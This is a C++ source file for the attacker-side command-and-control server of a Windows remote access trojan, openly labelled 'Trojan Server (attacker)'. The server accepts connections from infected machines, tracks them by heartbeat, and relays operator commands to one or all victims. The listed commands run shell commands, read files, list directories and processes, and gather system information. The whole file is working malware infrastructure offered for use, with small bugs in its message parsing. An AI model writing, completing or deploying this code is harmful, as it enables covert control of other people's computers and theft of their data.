// server.cpp - Trojan Server (attacker)
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <mutex>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT 10000
#define BUFFER_SIZE 4096

// Structure to hold client information
struct ClientInfo {
    SOCKET socket;
    struct sockaddr_in addr;
    char ipAddress[16];    // To store the IP address as string
    std::string clientId;  // To store the client identifier
    bool connected;        // Flag to track connection status
    DWORD lastHeartbeat;   // Timestamp of last heartbeat
};

// Global variables
std::vector<ClientInfo> clients;
std::mutex clientsMutex;  // Mutex to protect access to the clients vector
WSADATA wsaData;
bool serverRunning = true;

// Function prototypes
bool InitializeWinsock();
bool CreateServerSocket(SOCKET& serverSocket, sockaddr_in& serverAddr);
DWORD WINAPI HandleClient(LPVOID lpParam);
void CleanupWinsock();
DWORD WINAPI AcceptConnectionsThread(LPVOID lpParam);
void ListClients();
void SendCommandToClient(int clientIndex, const std::string& command);
void SendCommandToAllClients(const std::string& command);
void RemoveDisconnectedClient(int clientIndex);
DWORD WINAPI HeartbeatMonitorThread(LPVOID lpParam);

// Initialize Winsock
bool InitializeWinsock() {
    WORD wVersionRequested = MAKEWORD(2, 2);
    int result = WSAStartup(wVersionRequested, &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return false;
    }
    return true;
}

// Create server socket
bool CreateServerSocket(SOCKET& serverSocket, sockaddr_in& serverAddr) {
    // Create socket
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        printf("Error creating socket: %d\n", WSAGetLastError());
        WSACleanup();
        return false;
    }

    // Set up server address
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEFAULT_PORT);
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket
    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Bind failed: %d\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return false;
    }

    // Listen for incoming connections
    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        printf("Listen failed: %d\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return false;
    }

    return true;
}

// Function to handle client messages
DWORD WINAPI HandleClient(LPVOID lpParam) {
    int clientIndex = *(int*)lpParam;
    delete (int*)lpParam;  // Free memory allocated for clientIndex
    
    char buffer[BUFFER_SIZE];
    int bytesReceived;
    
    ClientInfo client;
    
    // Get client information safely
    {
        std::lock_guard<std::mutex> lock(clientsMutex);
        if (clientIndex >= clients.size()) {
            printf("Invalid client index\n");
            return 1;
        }
        client = clients[clientIndex];
    }
    
    printf("Starting handler for client %s\n", client.ipAddress);
    
    while (serverRunning) {
        // Receive data from client
        bytesReceived = recv(client.socket, buffer, sizeof(buffer), 0);
        
        if (bytesReceived <= 0) {
            // Client disconnected or error occurred
            printf("Client %s disconnected\n", client.ipAddress);
            RemoveDisconnectedClient(clientIndex);
            break;
        }
        
        // Null terminate the received data
        buffer[bytesReceived] = '\0';
        
        std::string message(buffer);
        
        // Process the received data
        if (message.substr(0, 14) == "CLIENT_CONNECT:") {
            // Extract client ID from connection message
            std::string clientId = message.substr(14);
            
            // Update client ID in the vector
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (clientIndex < clients.size()) {
                clients[clientIndex].clientId = clientId;
                clients[clientIndex].lastHeartbeat = GetTickCount();
                printf("Client %s identified as: %s\n", client.ipAddress, clientId.c_str());
            }
        }
        else if (message.substr(0, 10) == "HEARTBEAT:") {
            // Update heartbeat timestamp
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (clientIndex < clients.size()) {
                clients[clientIndex].lastHeartbeat = GetTickCount();
                // printf("Heartbeat from %s\n", client.ipAddress);
            }
        }
        else {
            // Regular message
            printf("Received from %s (%s): %s\n", 
                client.ipAddress, 
                client.clientId.c_str(), 
                buffer);
        }
    }
    
    return 0;
}

// Remove disconnected client
void RemoveDisconnectedClient(int clientIndex) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clientIndex >= 0 && clientIndex < clients.size()) {
        closesocket(clients[clientIndex].socket);
        clients.erase(clients.begin() + clientIndex);
        printf("Client at index %d removed from the list\n", clientIndex);
    }
}

// Function to accept clients
DWORD WINAPI AcceptConnectionsThread(LPVOID lpParam) {
    SOCKET serverSocket = *(SOCKET*)lpParam;
    sockaddr_in clientAddr;
    int clientAddrSize = sizeof(clientAddr);

    printf("Starting to accept connections...\n");

    while (serverRunning) {
        // Accept a connection
        SOCKET clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrSize);
        
        if (clientSocket == INVALID_SOCKET) {
            printf("Accept failed: %d\n", WSAGetLastError());
            Sleep(1000);  // Short delay to prevent CPU spike on continuous failures
            continue;
        }
        
        // Create client info
        ClientInfo newClient;
        newClient.socket = clientSocket;
        newClient.addr = clientAddr;
        newClient.connected = true;
        newClient.lastHeartbeat = GetTickCount();
        newClient.clientId = "Unknown";  // Will be updated when client sends identification
        
        // Convert IP address to string
        strcpy_s(newClient.ipAddress, inet_ntoa(clientAddr.sin_addr));
        
        // Add client to list
        int newClientIndex;
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clients.push_back(newClient);
            newClientIndex = clients.size() - 1;
        }
        
        printf("New client connected: %s (Index: %d)\n", newClient.ipAddress, newClientIndex);
        
        // Create a thread to handle the client
        int* clientIndexPtr = new int(newClientIndex);
        HANDLE hThread = CreateThread(NULL, 0, HandleClient, (LPVOID)clientIndexPtr, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);  // We don't need to track this handle
        } else {
            delete clientIndexPtr;  // Clean up if thread creation failed
            printf("Failed to create client handler thread\n");
        }
    }
    
    return 0;
}

// Thread to monitor client heartbeats
DWORD WINAPI HeartbeatMonitorThread(LPVOID lpParam) {
    const DWORD HEARTBEAT_TIMEOUT = 120000;  // 120 seconds (2 minutes)
    
    while (serverRunning) {
        std::vector<int> clientsToRemove;
        DWORD currentTime = GetTickCount();
        
        // Check for clients without recent heartbeats
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            
            for (int i = 0; i < clients.size(); i++) {
                DWORD timeSinceLastHeartbeat = currentTime - clients[i].lastHeartbeat;
                
                if (timeSinceLastHeartbeat > HEARTBEAT_TIMEOUT) {
                    printf("Client %s (%s) timed out (no heartbeat for %d seconds)\n", 
                        clients[i].ipAddress, 
                        clients[i].clientId.c_str(), 
                        timeSinceLastHeartbeat / 1000);
                    
                    clientsToRemove.push_back(i);
                }
            }
        }
        
        // Remove timed out clients (in reverse order to avoid index issues)
        for (int i = clientsToRemove.size() - 1; i >= 0; i--) {
            RemoveDisconnectedClient(clientsToRemove[i]);
        }
        
        // Check every 30 seconds
        Sleep(30000);
    }
    
    return 0;
}

// List connected clients
void ListClients() {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    printf("\n=== Connected Clients (%zu) ===\n", clients.size());
    
    if (clients.empty()) {
        printf("No clients connected\n");
    } else {
        for (size_t i = 0; i < clients.size(); i++) {
            DWORD currentTime = GetTickCount();
            DWORD timeSinceLastHeartbeat = currentTime - clients[i].lastHeartbeat;
            
            printf("%zu: IP: %s, ID: %s, Last heartbeat: %d seconds ago\n", 
                i, 
                clients[i].ipAddress, 
                clients[i].clientId.c_str(),
                timeSinceLastHeartbeat / 1000);
        }
    }
    
    printf("===========================\n\n");
}

// Send command to a specific client
void SendCommandToClient(int clientIndex, const std::string& command) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clientIndex >= 0 && clientIndex < clients.size()) {
        if (send(clients[clientIndex].socket, command.c_str(), command.length(), 0) == SOCKET_ERROR) {
            printf("Failed to send command to client %d (%s): %d\n", 
                clientIndex, 
                clients[clientIndex].ipAddress, 
                WSAGetLastError());
        } else {
            printf("Command sent to client %d (%s): %s\n", 
                clientIndex, 
                clients[clientIndex].ipAddress, 
                command.c_str());
        }
    } else {
        printf("Invalid client index: %d\n", clientIndex);
    }
}

// Send command to all connected clients
void SendCommandToAllClients(const std::string& command) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clients.empty()) {
        printf("No clients connected\n");
        return;
    }
    
    for (size_t i = 0; i < clients.size(); i++) {
        if (send(clients[i].socket, command.c_str(), command.length(), 0) == SOCKET_ERROR) {
            printf("Failed to send to client %zu (%s): %d\n", 
                i, 
                clients[i].ipAddress, 
                WSAGetLastError());
        } else {
            printf("Command sent to client %zu (%s)\n", i, clients[i].ipAddress);
        }
    }
}

// Cleanup Winsock
void CleanupWinsock() {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    // Close all client sockets
    for (size_t i = 0; i < clients.size(); i++) {
        closesocket(clients[i].socket);
    }
    
    clients.clear();
    WSACleanup();
}

// Display help
void DisplayHelp() {
    printf("\nAvailable commands:\n");
    printf("  help               - Show this help message\n");
    printf("  list               - List all connected clients\n");
    printf("  send <index> <cmd> - Send command to specific client\n");
    printf("  sendall <cmd>      - Send command to all clients\n");
    printf("  exit               - Exit the server\n");
    printf("\nClient commands:\n");
    printf("  SHELL <command>  - Execute shell command\n");
    printf("  LIST <dir>       - List files in directory\n");
    printf("  GETFILE <file>   - Get file content\n");
    printf("  SYSINFO          - Get system information\n");
    printf("  PROCLIST         - List running processes\n");
    printf("  PING             - Simple ping test\n");
    printf("\n");
}

// Main function
int main() {
    SOCKET serverSocket;
    sockaddr_in serverAddr;
    
    // Initialize Winsock
    if (!InitializeWinsock()) {
        return 1;
    }
    
    // Create server socket
    if (!CreateServerSocket(serverSocket, serverAddr)) {
        return 1;
    }
    
    printf("Server started. Listening on port %d...\n", DEFAULT_PORT);
    
    // Create thread to accept connections
    HANDLE hAcceptThread = CreateThread(NULL, 0, AcceptConnectionsThread, &serverSocket, 0, NULL);
    if (!hAcceptThread) {
        printf("Failed to create accept thread\n");
        CleanupWinsock();
        return 1;
    }
    
    // Create thread to monitor client heartbeats
    HANDLE hHeartbeatThread = CreateThread(NULL, 0, HeartbeatMonitorThread, NULL, 0, NULL);
    if (!hHeartbeatThread) {
        printf("Failed to create heartbeat monitor thread\n");
        // Continue anyway
    }
    
    DisplayHelp();
    
    // Enhanced console interface
    std::string input;
    while (serverRunning) {
        printf("\nCommand> ");
        std::getline(std::cin, input);
        
        if (input == "exit") {
            serverRunning = false;
            break;
        } 
        else if (input == "help") {
            DisplayHelp();
        }
        else if (input == "list") {
            ListClients();
        }
        else if (input.substr(0, 5) == "send " && input.length() > 5) {
            // Parse command: send <index> <command>
            size_t spacePos = input.find(' ', 5);
            if (spacePos != std::string::npos) {
                std::string indexStr = input.substr(5, spacePos - 5);
                std::string command = input.substr(spacePos + 1);
                
                try {
                    int index = std::stoi(indexStr);
                    SendCommandToClient(index, command);
                } catch (const std::exception& e) {
                    printf("Invalid client index. Use 'list' to see available clients.\n");
                }
            } else {
                printf("Invalid command format. Use: send <index> <command>\n");
            }
        }
        else if (input.substr(0, 8) == "sendall " && input.length() > 8) {
            // Send to all clients
            std::string command = input.substr(8);
            SendCommandToAllClients(command);
        }
        else {
            printf("Unknown command. Type 'help' for available commands.\n");
        }
    }
    
    // Wait for threads to finish
    printf("Shutting down server...\n");
    
    // If threads don't finish in 5 seconds, continue anyway
    WaitForSingleObject(hAcceptThread, 5000);
    CloseHandle(hAcceptThread);
    
    if (hHeartbeatThread) {
        WaitForSingleObject(hHeartbeatThread, 5000);
        CloseHandle(hHeartbeatThread);
    }
    
    // Close server socket
    closesocket(serverSocket);
    
    // Cleanup
    CleanupWinsock();
    
    printf("Server shutdown complete\n");
    
    return 0;
}